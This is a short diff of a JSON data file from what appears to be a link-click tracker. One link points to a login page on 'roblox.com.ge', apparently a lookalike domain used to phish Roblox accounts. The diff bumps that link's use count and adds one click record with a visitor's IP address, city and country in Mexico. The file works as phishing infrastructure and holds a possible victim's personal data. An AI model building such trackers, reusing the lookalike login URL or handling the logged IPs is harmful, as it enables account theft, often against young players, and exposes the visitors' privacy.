@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1112,
+    "useCount": 1113,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9040,6 +9040,14 @@
         "city": "Nairobi",
         "flag": "🇰🇪",
         "countryCode": "KE"
+      },
+      {
+        "timestamp": 1777265775081,
+        "ip": "189.218.8.96",
+        "country": "Mexico",
+        "city": "Monterrey",
+        "flag": "🇲🇽",
+        "countryCode": "MX"
       }
     ]
   },
